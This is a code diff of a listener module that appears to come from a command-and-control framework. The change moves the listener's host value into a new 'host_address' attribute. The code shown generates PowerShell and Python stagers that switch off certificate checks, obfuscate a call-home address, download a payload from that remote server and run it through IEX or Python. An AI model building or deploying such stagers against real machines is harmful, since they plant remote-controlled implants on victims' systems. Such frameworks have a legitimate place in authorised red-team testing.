@@ -84,6 +84,7 @@ class Listener:
         # required:
         self.mainMenu = mainMenu
         self.thread = None
+        self.host_address = None
 
         self.instance_log = log
 
@@ -124,16 +125,11 @@ class Listener:
             log.error("listeners/http_hop generate_launcher(): no language specified!")
             return None
 
-        active_listener = self
-        # extract the set options for this instantiated listener
-        listenerOptions = active_listener.options
-        redirect_name = listenerOptions["RedirectListener"]["Value"]
+        redirect_name = self.options["RedirectListener"]["Value"]
         listener = self.mainMenu.listenersv2.get_active_listener_by_name(redirect_name)
-
-        host = listenerOptions["Host"]["Value"]
-        launcher = listenerOptions["Launcher"]["Value"]
-        staging_key = listenerOptions["RedirectStagingKey"]["Value"]
-        profile = listenerOptions["DefaultProfile"]["Value"]
+        launcher = self.options["Launcher"]["Value"]
+        staging_key = self.options["RedirectStagingKey"]["Value"]
+        profile = self.options["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         cookie = listener.session_cookie
@@ -153,7 +149,7 @@ class Listener:
                 user_agent = profile.split("|")[1]
             stager += f"$u='{user_agent}';"
 
-            if "https" in host:
+            if "https" in self.host_address:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -201,7 +197,7 @@ class Listener:
 
             # add the routing packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
-            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listener_name}';"
+            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
             stager += "$data=$wc.DownloadData($ser+$t);"
 
             # decode everything and kick it over to IEX to kick off execution
@@ -229,7 +225,7 @@ class Listener:
             # Python
 
             launcherBase = "import sys;"
-            if "https" in host:
+            if "https" in self.host_address:
                 # monkey patch ssl woohooo
                 launcherBase += dedent(
                     """
@@ -250,7 +246,7 @@ class Listener:
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{user_agent}';server='{host}';t='{stage0}';hop='{listener_name}';
+                UA='{user_agent}';server='{self.host_address}';t='{stage0}';hop='{listener_name}';
                 req=urllib.request.Request(server+t);
                 """
             )
@@ -344,7 +340,6 @@ class Listener:
         staging_key = listener.options["StagingKey"]["Value"]
         workingHours = listener.options["WorkingHours"]["Value"]
         killDate = listener.options["KillDate"]["Value"]
-        host = listenerOptions["Host"]["Value"]
         customHeaders = profile.split("|")[2:]
         session_cookie = listener.options["Cookie"]["Value"]
 
@@ -392,7 +387,7 @@ class Listener:
                 "staging_key": staging_key,
                 "profile": profile,
                 "session_cookie": session_cookie,
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
                 "agent_private_cert_key": private_key_array,
@@ -400,10 +395,6 @@ class Listener:
                 "agent_public_cert_key": public_key_array,
             }
             stager = template.render(template_options)
-
-            # make sure the server ends with "/"
-            if not host.endswith("/"):
-                host += "/"
 
             # Patch in custom Headers
             remove = []
@@ -446,7 +437,7 @@ class Listener:
                 "agent_public_cert_key": listener.agent_public_cert_key,
                 "profile": profile,
                 "session_cookie": session_cookie,
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
             }
@@ -484,8 +475,6 @@ class Listener:
 
         This is so agents can easily be dynamically updated for the new listener.
         """
-        host = listenerOptions["Host"]["Value"]
-
         if not language:
             log.error("listeners/http_hop generate_comms(): no language specified!")
             return None
@@ -507,7 +496,7 @@ class Listener:
             powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
             template_options = {
                 "session_cookie": "",
-                "host": host,
+                "host": self.host_address,
                 "agent_private_cert_key": powershell_array,
                 "agent_public_cert_key": self.agent_public_cert_key,
             }
@@ -524,7 +513,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": "",
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
@@ -555,7 +544,7 @@ class Listener:
         self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
             "DefaultProfile"
         ]["Value"]
-        redirectHost = redirectListenerOptions.options["Host"]["Value"]
+        redirectHost = redirectListenerOptions.host_address
 
         uris = list(self.options["DefaultProfile"]["Value"].split("|")[0].split(","))
 
